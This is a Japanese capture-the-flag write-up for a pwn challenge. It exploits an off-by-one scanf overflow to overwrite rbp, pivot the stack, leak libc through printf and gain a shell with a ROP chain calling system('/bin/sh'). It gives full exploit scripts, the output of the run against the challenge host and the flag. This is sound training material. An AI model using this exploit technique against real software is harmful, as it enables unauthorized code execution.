# wall:Pwn:200pts
You've got a message.  

[wall.tar.gz](wall.tar.gz)  

`nc 34.170.146.252 40015`  

# Solution
ファイル一式と接続先が渡される。  
ソースは以下である。  
```c
#include <stdio.h>
#include <stdlib.h>

char message[4096];

void get_name(void) {
  char name[128];
  printf("What is your name? ");
  scanf("%128[^\n]%*c", name);
  printf("Message from %s: \"%s\"\n", name, message);
}

int main(int argc, char **argv) {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  printf("Message: ");
  scanf("%4096[^\n]%*c", message);
  get_name();
  return 0;
}
```
二つの`scanf`の箇所でoff-by-oneがある。  
`rbp`の末尾1バイトを書き換えてスタックを上へずらしてやり、そこに配置した確率的なropへ持ち込む。  
`rbp壊したら、leaveとretを二回呼べ`とPwn有識者から教えられているため`get_name`の方を利用する。
libc.so.6が配布されていることからもわかる通り、まずはlibcをリークしなければならない。  
スタックのアライメントに注意し、`ret`を調整しながら`printf`でリークを行う。  
```python
from ptrlib import *

elf = ELF("./wall")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# libc = ELF("./libc.so.6")

sock = Process("./wall")
# sock = Socket("nc 34.170.146.252 40015")
sock.debug = True

payload = b"SATOKI"
sock.sendlineafter("Message: ", payload)

payload = p64(next(elf.gadget("ret;"))) * 12
payload += p64(elf.plt("printf"))
payload += p64(next(elf.gadget("ret;")))
payload += p64(elf.symbol("main"))
payload += b"A" * (128 - len(payload))
sock.sendlineafter("What is your name? ", payload)

sock.recvline()

logger.info(f"leak = {hex(u64(sock.recvuntil('M', drop=True, lookahead=True)))}")
```
実行する。  
```bash
$ python solver.py
[+] __init__: Successfully created new process './wall' (PID=42535)
[+] recv: Received 0x9 (9) bytes:
    00000000  4d 65 73 73 61 67 65 3a  20                       |Message: |
[+] send: Sent 0x7 (7) bytes:
00000000  53 41 54 4f 4b 49 0a                              |SATOKI.|
[+] recv: Received 0x13 (19) bytes:
    00000000  57 68 61 74 20 69 73 20  79 6f 75 72 20 6e 61 6d  |What is your nam|
    00000010  65 3f 20                                          |e? |
[+] send: Sent 0x81 (129) bytes:
00000000  1a 10 40 00 00 00 00 00  1a 10 40 00 00 00 00 00  |..@.......@.....|
00000010  1a 10 40 00 00 00 00 00  1a 10 40 00 00 00 00 00  |..@.......@.....|
*
00000060  74 10 40 00 00 00 00 00  1a 10 40 00 00 00 00 00  |t.@.......@.....|
00000070  d6 11 40 00 00 00 00 00  41 41 41 41 41 41 41 41  |..@.....AAAAAAAA|
00000080  0a                                                |.|
[+] recv: Received 0x2a (42) bytes:
    00000000  4d 65 73 73 61 67 65 20  66 72 6f 6d 20 1a 10 40  |Message from ..@|
    00000010  3a 20 22 53 41 54 4f 4b  49 22 0a 50 d0 ac 8a da  |: "SATOKI".P....|
    00000020  7f 4d 65 73 73 61 67 65  3a 20                    |.Message: |
[+] <module>: leak = 0x7fda8aacd050
[+] _close_impl: './wall' (PID=42535) killed by `close`
```
何度か試すと`funlockfile`がリークできたため、libcのベースが分かる。  
あとはもう一度同じくropを行い、libcの中の`system`を呼んでやればいい。  
以下のsolver.pyで行う。  
```python
from ptrlib import *

elf = ELF("./wall")

# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")

# sock = Process("./wall")
sock = Socket("nc 34.170.146.252 40015")
# sock.debug = True

payload = b"SATOKI"
sock.sendlineafter("Message: ", payload)

payload = p64(next(elf.gadget("ret;"))) * 12
payload += p64(elf.plt("printf"))
payload += p64(next(elf.gadget("ret;")))
payload += p64(elf.symbol("main"))
payload += b"A" * (128 - len(payload))
sock.sendlineafter("What is your name? ", payload)

sock.recvline()
libc.base = u64(sock.recvuntil("M", drop=True, lookahead=True)) - libc.symbol(
    "funlockfile"
)

payload = b"TSUJI"
sock.sendlineafter("Message: ", payload)

payload = p64(next(elf.gadget("ret;"))) * 12
payload += p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(next(libc.search("/bin/sh")))
payload += p64(libc.symbol("system"))
payload += b"B" * (128 - len(payload))
sock.sendlineafter("What is your name? ", payload)

sock.sh()
```
実行する。  
```bash
$ python solver.py
[+] __init__: Successfully connected to 34.170.146.252:40015
[+] base: New base address: 0x7f28ee7a9000
[ptrlib]$ Message from ␦@: "TSUJI"
[ptrlib]$ ls
bin
boot
dev
etc
flag-6d5a5cb38e69f72e74235bf99e6f1e9b.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
[ptrlib]$ cat flag-6d5a5cb38e69f72e74235bf99e6f1e9b.txt
Alpaca{p1v0T1ng_t0_Bss_i5_tR1cKy_du3_7o_st4Ck_s1Z3_Lim17}
```
何度か実行するとシェルが得られ、ファイルにflagが書かれていた。  

## Alpaca{p1v0T1ng_t0_Bss_i5_tR1cKy_du3_7o_st4Ck_s1Z3_Lim17}